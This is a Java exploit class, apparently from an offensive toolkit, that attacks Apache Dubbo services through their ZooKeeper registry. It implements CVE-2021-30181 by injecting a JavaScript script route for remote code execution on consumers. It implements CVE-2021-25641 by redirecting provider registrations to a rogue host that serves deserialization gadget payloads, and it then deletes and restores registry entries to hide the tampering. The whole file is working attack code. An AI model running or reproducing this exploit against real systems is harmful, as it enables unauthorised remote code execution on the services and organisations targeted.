package com.threedr3am.exp.dubbo;

import java.io.IOException;
import java.io.OutputStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.SocketException;
import java.net.URLDecoder;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.atomic.AtomicLong;
import org.apache.curator.framework.AuthInfo;
import org.apache.curator.framework.CuratorFramework;
import org.apache.curator.framework.CuratorFrameworkFactory;
import org.apache.curator.retry.RetryNTimes;
import org.apache.zookeeper.CreateMode;

/**
 * @author threedr3am
 */
public class Exploit {

  public void attack(String host, int port, byte[] payload) {
    Socket socket = null;
    try {
      socket = new Socket(host, port);
      OutputStream outputStream = socket.getOutputStream();
      outputStream.write(payload);
      outputStream.flush();
      outputStream.close();
    } catch (IOException e) {
      e.printStackTrace();
    }
  }

  /**
   * [CVE-2021-30181] RCE on customers via Script route poisoning (Nashorn script injection)
   *  @param zookeeperUri
   * @param scheme
   * @param zookeeperUsername
   * @param zookeeperPassword
   * @param route
   * @param rule
   * @param routeDeleteTtl
   */
  public void route(String zookeeperUri, String scheme, String zookeeperUsername,
      String zookeeperPassword, String route, String rule, Integer routeDeleteTtl) {
    CuratorFramework client = connectZk(zookeeperUri, scheme,
        zookeeperUsername, zookeeperPassword);
    client.start();
    if (route.equals("script")) {
      String example = null;
      try {
        example = getExample(client, "/");
      } catch (Exception e) {
        e.printStackTrace();
      }
      if (example == null) {
        return;
      }
      String data = makeData(example, rule);
      try {
        injectScript(client, "/", data, routeDeleteTtl);
      } catch (Exception e) {
        e.printStackTrace();
      }
    }
  }

  private String makeData(String example, String rule) {
    String pathForDecode = URLDecoder.decode(example);
    pathForDecode = pathForDecode.replace("consumer://", "script://");
    pathForDecode = pathForDecode.replace("category=consumers", "category=routers");
    pathForDecode = pathForDecode + (pathForDecode.endsWith("&") ? "" : "&") + "route=script&type=javascript&rule=" + URLEncoder.encode(rule);
    return URLEncoder.encode(pathForDecode);
  }

  private void injectScript(CuratorFramework client, String path, String data,
      Integer routeDeleteTtl) throws Exception {
    List<String> all = client.getChildren().forPath(path);
    for (String i : all) {
      String uniqueChildren = path + (path.endsWith("/") ? "" : "/") + i;
      if (i.equals("routers")) {
        client.create().forPath(uniqueChildren + "/" + data, "127.0.0.1".getBytes());
        Thread.sleep(routeDeleteTtl * 1000L);
        client.delete().forPath(uniqueChildren + "/" + data);
      }
      injectScript(client, uniqueChildren, data, routeDeleteTtl);
    }
  }

  private String getExample(CuratorFramework client, String path) throws Exception {
    List<String> all = client.getChildren().forPath(path);
    for (String i : all) {
      String uniqueChildren = path + (path.endsWith("/") ? "" : "/") + i;
      if (i.equals("consumers")) {
        List<String> examples = client.getChildren().forPath(uniqueChildren);
        if (examples.size() > 0) {
          return examples.get(0);
        }
      }
      String example = getExample(client, uniqueChildren);
      if (example != null) {
        return example;
      }
    }
    return null;
  }

  /**
   * [CVE-2021-25641] Potential deserialization id tampering from network
   *
   * @param zookeeperUri
   * @param scheme
   * @param zookeeperUsername
   * @param zookeeperPassword
   * @param rougeHost
   * @param rougePort
   * @param attackRegister
   * @param payload
   * @param serialization
   * @param wait
   */
  public void evil(String zookeeperUri, String scheme, String zookeeperUsername,
      String zookeeperPassword, String rougeHost, int rougePort,
      boolean attackRegister, byte[][] payload, String serialization, long wait) {

    CuratorFramework client = connectZk(zookeeperUri, scheme,
        zookeeperUsername, zookeeperPassword);
    if (attackRegister)
      client.start();

    ExecutorService executorService = Executors.newSingleThreadExecutor();
    Runtime.getRuntime().addShutdownHook(new Thread(() -> executorService.shutdown()));
    AtomicInteger againCount = new AtomicInteger(1);
    Map<String, String> data = new HashMap<>();
    Map<String, List<String>> recoverData = new HashMap<>();
    for (int i = 0; i < payload.length; i++) {
      int finalI = i;
      Future future = executorService.submit(() -> {
        try {
          ServerSocket serverSocket = new ServerSocket(rougePort + finalI);
          AtomicInteger attackCount = new AtomicInteger();
          AtomicLong start = new AtomicLong(0L);
          ExecutorService socketExecutor = Executors.newSingleThreadExecutor();
          socketExecutor.execute(() -> {
              while (true) {
                try {
                  Socket socket = serverSocket.accept();
                  OutputStream outputStream = socket.getOutputStream();
                  outputStream.write(payload[finalI]);
                  outputStream.flush();
                  outputStream.close();
                  attackCount.getAndIncrement();
                  if (start.get() == 0)
                    start.set(System.currentTimeMillis());
                } catch (Exception e) {
                  if (e instanceof SocketException) {
                    e.printStackTrace();
                  }
                }
              }
          });
          while (start.get() == 0L || System.currentTimeMillis() - start.get() < wait
              || /*暂时不用计数*/attackCount.get() < againCount.get()) {
            ;
          }
          socketExecutor.shutdown();
        } catch (IOException e) {
          e.printStackTrace();
        }
      });
      List<String> clearData = null;
      if (attackRegister) {
        String unique = "/";
        try {
          if (data.isEmpty())
            initData(data, unique, client, recoverData);
        } catch (Exception e) {
          e.printStackTrace();
        }
        againCount.set(data.size());
        clearData = attackRegister(client, data, "dubbo", rougeHost, rougePort + i, serialization);
      }
      System.out.println("attack use gadget[" + i + "]...");
      try {
        future.get();
      } catch (InterruptedException e) {
        e.printStackTrace();
      } catch (ExecutionException e) {
        e.printStackTrace();
      }
      if (clearData != null) {
        clearData.stream().forEach(p -> {
          try {
            client.delete().forPath(p);
          } catch (Exception e) {
            e.printStackTrace();
          }
        });
      }
    }
    for (Map.Entry<String, List<String>> e:recoverData.entrySet()) {
      e.getValue().forEach(item -> {
        try {
          client.create().withMode(CreateMode.EPHEMERAL).forPath(e.getKey() + "/" + item);
        } catch (Exception ex) {
          ex.printStackTrace();
        }
      });
    }

  }

  private CuratorFramework connectZk(String zookeeperUri, String scheme,
      String zookeeperUsername, String zookeeperPassword) {
    CuratorFrameworkFactory.Builder builder = CuratorFrameworkFactory.builder()
        .connectString(zookeeperUri)
        .retryPolicy(new RetryNTimes(1, 1000))
        .connectionTimeoutMs(3000)
        .sessionTimeoutMs(600000);
    if (zookeeperUsername != null && zookeeperPassword != null && !zookeeperUsername.isEmpty()
        && !zookeeperPassword.isEmpty()) {
      scheme = scheme == null || scheme.isEmpty() ? "auth" : scheme;
      //auth：使用id来进行验证，可以认为是直接传入 userName:passWord 来进行验证
      //digest：也是使用用户名：密码的形式进行验证，不过要对passWord进行MD5哈希，然后再进行bese64。
      AuthInfo authInfo = new AuthInfo(scheme,
          (zookeeperUsername + ":" + zookeeperPassword).getBytes());
      builder.authorization(Arrays.asList(authInfo));
    }
    CuratorFramework client = builder.build();
    return client;
  }

  private List<String> attackRegister(CuratorFramework client,
      Map<String, String> data, String scheme, String rougeHost, final int rougePort,
      String serialization) {
    List<String> clearData = new ArrayList<>();
    data.entrySet().forEach(d -> {
      String pathParent = d.getKey();
      String path = d.getValue();
      try {
        if (client.checkExists().forPath(pathParent + "/" + path) != null)
          client.delete().forPath(pathParent + "/" + path);
      } catch (Exception e) {
        e.printStackTrace();
      }
      String pathForDecode = URLDecoder.decode(path);
      pathForDecode = pathForDecode
          .replaceAll("dubbo://.+?/", scheme + "://" + rougeHost + ":" + rougePort + '/');
      pathForDecode = pathForDecode.replaceAll("serialization=.+?&", "");
      pathForDecode = pathForDecode + (pathForDecode.endsWith("&") ? "" : "&") + "serialization="
          + serialization;
      String rougePathForEncode = URLEncoder
          .encode(pathForDecode);
      try {
        client.create().withMode(CreateMode.EPHEMERAL)
            .forPath(pathParent + "/" + rougePathForEncode);
      } catch (Exception e) {
        e.printStackTrace();
      }
      clearData.add(pathParent + "/" + rougePathForEncode);
    });
    return clearData;
  }

  private void initData(Map<String, String> data, String unique,
      CuratorFramework client, Map<String, List<String>> recoverData) throws Exception {
    List<String> all = client.getChildren().forPath(unique);
    for (String i : all) {
      String uniqueChildren = unique + (unique.length() != 1 ? "/" : "") + i;
      if (i.equals("providers")) {
        makeData(data, uniqueChildren, client, recoverData);
        continue;
      }
      initData(data, uniqueChildren, client, recoverData);
    }
  }

  private void makeData(Map<String, String> data, String provider, CuratorFramework client,
      Map<String, List<String>> recoverData)
      throws Exception {
    List<String> all = client.getChildren().forPath(provider);
    if (all.size() > 0) {
      recoverData.put(provider, all);
      data.put(provider, all.get(0));
    }
  }

}
